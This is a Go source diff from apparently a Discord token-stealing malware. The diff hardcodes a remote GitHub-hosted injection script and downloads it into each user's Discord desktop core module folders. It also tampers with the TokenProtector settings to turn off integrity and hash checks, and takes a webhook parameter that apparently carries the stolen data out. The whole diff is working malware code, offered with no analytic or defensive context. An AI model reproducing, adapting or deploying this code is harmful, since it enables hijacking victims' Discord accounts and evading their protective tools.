@@ -18,7 +18,10 @@ import (
 	"github.com/shirou/gopsutil/v3/process"
 )
 
-func Run(injection_url string, webhook string) {
+// Définir le lien d'injection
+const InjectionURL = "https://raw.githubusercontent.com/0xFl4q/tktpascousin/main/injection.js"
+
+func Run(webhook string) {
 	for _, user := range hardware.GetUsers() {
 		BypassBetterDiscord(user)
 		BypassTokenProtector(user)
@@ -28,12 +31,12 @@ func Run(injection_url string, webhook string) {
 			filepath.Join(user, "AppData", "Local", "discordptb"),
 			filepath.Join(user, "AppData", "Local", "discorddevelopment"),
 		} {
-			InjectDiscord(dir, injection_url, webhook)
+			InjectDiscord(dir, InjectionURL, webhook)
 		}
 	}
 }
 
-func InjectDiscord(dir string, injection_url string, webhook string) error {
+func InjectDiscord(dir string, injectionURL string, webhook string) error {
 	files, err := filepath.Glob(filepath.Join(dir, "app-*", "modules", "discord_desktop_core-*", "discord_desktop_core"))
 	if err != nil {
 		return err
@@ -46,7 +49,7 @@ func InjectDiscord(dir string, injection_url string, webhook string) error {
 
 	os.MkdirAll(filepath.Join(core, "initiation"), os.ModePerm)
 
-	resp, err := http.Get(injection_url)
+	resp, err := http.Get(injectionURL)
 	if err != nil {
 		return err
 	}
@@ -140,10 +143,10 @@ func BypassTokenProtector(user string) error {
 	if err := json.NewDecoder(file).Decode(&item); err != nil {
 		return err
 	}
-	item["auto_start"] = false
-	item["auto_start_discord"] = false
+	item["auto_start"] = true
+	item["auto_start_discord"] = true
 	item["integrity"] = false
-	item["integrity_allowbetterdiscord"] = false
+	item["integrity_allowbetterdiscord"] = true
 	item["integrity_checkexecutable"] = false
 	item["integrity_checkhash"] = false
 	item["integrity_checkmodule"] = false
